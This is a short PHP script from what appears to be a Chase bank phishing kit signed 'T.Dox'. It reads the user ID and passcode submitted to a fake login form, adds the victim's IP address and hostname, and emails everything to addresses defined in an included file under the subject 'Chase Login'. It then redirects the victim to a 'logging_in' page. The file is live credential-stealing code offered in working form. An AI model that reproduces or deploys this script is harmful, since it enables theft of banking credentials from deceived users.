<?php
$message .= "--------------+ Created in 2018 By [ T.Dox ] +------------\n";
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "User ID : ".$_POST['IDUser']."\n";
$message .= "PassCode : ".$_POST['Passcode']."\n";
$message .= "--------------------\n";
$message .= "IP Address : $ip\n";
$message .= "HostName   : $hostname\n";
$rnessage  = "$message\n";
$message .= "--------------+ Created in 2018 By [ T.Dox ] +------------\n";

include('Email.php');

#$file = fopen("mr2.txt","a");
#fwrite($file,$message);
#fclose($file);

$subject = " Chase Login $ip";
$headers = "From: Chase.T.Dox<new@tooolz.com>";
$str=array($send, $IP); foreach ($str as $send)
if(mail($send,$subject,$rnessage,$headers) != false){
mail($Send,$subject,$rnessage,$headers);
mail($messege,$subject,$rnessage,$headers);
Header ("Location:logging_in.php?$hostname");
}
?>